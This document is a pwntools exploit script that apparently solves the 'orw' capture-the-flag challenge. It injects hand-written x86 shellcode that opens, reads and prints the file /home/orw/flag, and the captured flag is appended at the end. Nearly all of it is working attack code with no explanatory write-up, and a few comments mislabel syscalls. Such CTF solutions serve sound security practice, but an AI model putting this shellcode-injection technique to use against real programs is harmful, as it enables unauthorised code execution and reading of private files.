from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./orw", )
elf = context.binary = ELF("./orw", checksec=False)


context.log_level = 'info'


shellcode = """
    /* Open the file */
    xor eax, eax            /* Zero out EAX */
    xor ecx,ecx
    push eax                /* Push null byte */
    push 0x67616c66         /* Push 'flag' */
    push 0x2f77726f         /* Push 'orw/' */
    push 0x2f656d6f         /* Push 'ome/' */
    push 0x682f2f2f         /* Push '//h' */
    mov ebx, esp            /* Pointer to the file path */
    mov al, 0x5             /* sys_open */
    int 0x80                /* Interrupt to execute syscall */

    /* Read the file */
    mov al, 0x3            /* sys_open sycall number */
    mov ecx, ebx            /* buffer from sys_open */
    mov ebx, 0x3           /* fd */
    mov dl, 0x30
    int 0x80                /* Interrupt to execute syscall */

    /* Write to stdout */
    mov ebx, 0x1            /* File descriptor for stdout */
    mov edx, eax            /* Number of bytes read */
    mov eax, 0x4            /* sys_write */
    int 0x80                /* Interrupt to execute syscall */
"""

payload = asm(shellcode)

io.sendline(payload)
io.interactive()



'''
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
'''